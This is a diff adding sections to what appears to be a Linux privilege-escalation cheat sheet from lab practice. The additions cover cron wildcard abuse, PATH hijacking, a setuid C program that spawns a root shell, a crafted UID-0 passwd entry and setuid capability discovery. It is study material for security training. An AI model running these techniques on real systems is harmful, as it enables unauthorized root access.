@@ -48,11 +48,47 @@ Session completed
 
 ## Cron
 
-ToDo
+read cron jobs with `/etc/crontab`
 
+For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature
+
+Be sure the file has `chmod +x`
 ## Environment var
 
-ToDo
+Show PATH var
+```console
+echo $PATH
+```
+
+Add direcotry to PATH var
+```console
+export PATH=/tmp:$PATH
+```
+
+Find writeble folders
+```console
+$ find / -writable 2>/dev/null |cut -d "/" -f 2 | sort -u
+```
+
+```console
+#!/bin/bash
+/bin/bash
+```
+Set chmod 777
+
+```c
+#Spawn Bash C
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+int main (void) {
+        setuid(0);
+        setgid(0);
+        system("/bin/bash -p");
+        return 0;
+}
+```
+set chmod x+s
 
 ## SUID
 
@@ -81,6 +117,24 @@ Format: `test:x:0:0:root:/root:/bin/bash`
 
 ```console
 New entry
-new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
+$ new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
 ```
+
+## Capabilities
+
+Find capabilities:
+
+```console
+$ getcap -r / 2>/dev/null
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/ping = cap_net_raw+ep
+/home/karen/vim = cap_setuid+ep
+/home/ubuntu/view = cap_setuid+ep
+```
+
+Look at [GTFOBins](https://gtfobins.github.io/) for leverage
+
+
 
